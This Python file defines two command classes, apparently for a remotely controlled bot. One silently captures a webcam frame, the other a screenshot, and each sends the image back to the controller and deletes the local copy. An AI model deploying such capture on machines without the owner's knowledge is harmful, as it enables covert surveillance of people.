import os, time, cv2, pyautogui
from commands.base_command import Command

class WebCamCommand(Command):

    PATH = "web.png"

    def execute(self):
        try:
            self._capture()
            self.send_photo(self.PATH)
        except Exception as e:
            self.send(f"ERROR CAMERA: {e}")
        finally:
            if os.path.exists(self.PATH):
                os.remove(self.PATH)

    def _capture(self):
        cap = cv2.VideoCapture(0)
        for _ in range(10):
            cap.read()
        ret, frame = cap.read()
        cap.release()

        if not ret:
            raise RuntimeError("Failed to capture image")

        cv2.imwrite(self.PATH, frame)

class ScreenshotCommand(Command):
    PATH = "screenshot.png"
    DELAY = 3

    def execute(self):
        try:
            self.send(f"Screenshot after {self.DELAY} seconds")
            time.sleep(self.DELAY)
            self._capture()
            self.send_photo(self.PATH)
        except Exception as e:
            self.send(f"ERROR SCREENSHOT: {e}")
        finally:
            if os.path.exists(self.PATH):
                os.remove(self.PATH)

    def _capture(self):
        screenshot = pyautogui.screenshot()
        screenshot.save(self.PATH)